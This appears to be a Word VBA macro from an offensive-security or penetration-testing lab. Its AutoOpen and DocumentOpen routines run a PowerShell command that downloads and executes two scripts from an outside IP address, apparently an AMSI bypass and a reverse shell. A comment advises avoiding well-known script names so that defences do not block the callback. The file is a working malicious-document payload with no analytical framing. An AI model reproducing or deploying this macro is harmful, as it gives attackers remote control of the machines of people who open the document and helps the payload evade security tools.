Sub mymacro()
    Dim Command As String
    ` Make sure not to use common powershell scripts names like Invoke-ReflectivePEInjection as we will not be able to get callback to our machine.
    Command = "powershell.exe iex(iwr http://192.168.45.159/amit.txt -UseBasicParsing);iex(iwr http://192.168.45.159/rev.ps1 -UseBasicParsing)"
    `For 32bit Word running on x64 system: C:\Windows\Sysnative\WindowsPowershell\v1.0\powershell iex(iwr http://192.168.45.159/amit.txt -useb); iex(iwr http://192.168.45.159/rev.ps1 -useb)
    Shell Command, 1
End Sub
Sub AutoOpen()
    mymacro
End Sub
Sub DocumentOpen()
    mymacro
End Sub
